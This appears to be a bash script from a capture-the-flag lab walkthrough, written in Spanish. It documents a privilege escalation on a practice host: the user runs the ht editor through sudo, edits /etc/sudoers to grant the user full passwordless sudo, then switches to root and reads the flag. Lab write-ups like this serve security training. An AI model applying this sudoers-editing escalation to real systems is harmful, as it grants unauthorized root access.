#!/bin/bash
# ==============================================================
# 06 - Escalada de privilegios con el editor ht
# ==============================================================
# Una vez dentro como loneferret, el fichero CompanyPolicy.README
# en su home indica que "sudo ht" es la herramienta permitida.
# El editor ht abre con privilegios de root y permite editar
# /etc/sudoers directamente.
#
# PASOS MANUALES (ejecutar en la sesión SSH como loneferret):
#
# 1. Estabilizar el terminal:
#      export TERM=xterm
#
# 2. Leer la pista de escalada:
#      cat CompanyPolicy.README
#
# 3. Abrir el editor ht con sudo:
#      sudo /usr/local/bin/ht
#
# 4. Dentro del editor ht:
#    - Navegar: tecla ALT (activa el menú)
#    - Abrir fichero: ALT + F -> Open -> /etc/sudoers
#
# 5. Localizar la línea de user privilege specification y añadir:
#      loneferret ALL=(ALL) NOPASSWD: ALL
#
# 6. Guardar: ALT + F -> Save
#
# 7. Salir del editor: ALT + F -> Quit  (o F10)
#
# 8. Escalar a root:
#      sudo su
#      whoami   # debe devolver: root
#
# 9. Capturar la flag:
#      cat /root/Congrats.txt
# ==============================================================

echo "Este script documenta los pasos manuales de la escalada."
echo "Ejecútalo dentro de la sesión SSH como loneferret@10.0.2.26."
echo ""
echo "Comando inicial: export TERM=xterm && sudo /usr/local/bin/ht"
